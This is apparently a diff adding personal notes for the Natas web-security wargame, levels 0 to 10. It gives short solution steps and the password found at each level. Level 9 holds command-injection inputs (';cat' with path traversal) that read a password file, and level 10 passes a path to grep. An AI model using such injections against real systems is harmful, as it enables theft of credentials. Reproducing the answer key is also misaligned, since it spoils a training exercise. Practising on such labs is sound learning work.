@@ -1,0 +1,43 @@
+level0
+natas0
+
+level1
+right click:inspect
+g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
+
+level2
+ctrl+shift+i:inspect
+h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
+
+level3
+inspect:add /files in url:users.txt
+G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+
+level4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+referer:burp suite:http history:index.php:send to repeater:change to natas5:send
+Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+level5
+indexphp:cookie[loggedin]:cookie:loggedin value=1
+fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+level6
+view sourcepage:add link to url:submit code
+jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+level7
+homepage:add url to home
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+level8
+view sourcecode:given 'binhex,reverse.base64':hex to text:reverse:base64
+Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+level9
+;ls ../../../../../etc/natas_webpass/natas10
+;cat ../../../../../etc/natas_webpass/natas10
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+level10
+a /etc/natas_webpass/natas11
+1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
